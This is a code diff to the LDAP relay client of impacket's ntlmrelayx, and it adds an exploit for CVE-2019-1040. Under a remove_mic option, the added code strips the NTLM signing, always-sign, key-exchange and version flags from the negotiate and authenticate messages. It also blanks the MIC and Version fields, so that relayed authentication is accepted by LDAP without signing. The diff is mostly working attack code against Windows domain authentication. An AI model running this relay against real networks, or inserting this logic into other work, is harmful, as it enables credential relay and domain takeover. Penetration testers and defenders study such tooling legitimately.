@@ -29,7 +29,7 @@ except ImportError:
 
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN
+from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenResp
 
 PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]
@@ -61,14 +61,20 @@ class LDAPRelayClient(ProtocolClient):
 
     def sendNegotiate(self, negotiateMessage):
         # Remove the message signing flag
-        # For LDAP this is required otherwise it triggers LDAP signing
+        # For SMB->LDAP this is required otherwise it triggers LDAP signing
 
         # Note that this code is commented out because changing flags breaks the signature
         # unless the client uses a non-standard implementation of NTLM
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(negotiateMessage)
-        #negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
-        self.negotiateMessage = str(negoMessage)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+
+        self.negotiateMessage = negoMessage.getData()
 
         # Warn if the relayed target requests signing, which will break our attack
         if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
@@ -89,7 +95,6 @@ class LDAPRelayClient(ProtocolClient):
                     request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                     response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                     result = response[0]
-
                     if result['result'] == RESULT_SUCCESS:
                         challenge = NTLMAuthChallenge()
                         challenge.fromString(result['server_creds'])
@@ -102,11 +107,30 @@ class LDAPRelayClient(ProtocolClient):
         return self.negotiateMessage
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
-        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
             token = respToken2['ResponseToken']
         else:
             token = authenticateMessageBlob
+
+        authMessage = NTLMAuthChallengeResponse()
+        authMessage.fromString(token)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+            authMessage['MIC'] = b''
+            authMessage['MICLen'] = 0
+            authMessage['Version'] = b''
+            authMessage['VersionLen'] = 0
+            token = authMessage.getData()
+
         with self.session.connection_lock:
             self.authenticateMessageBlob = token
             request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
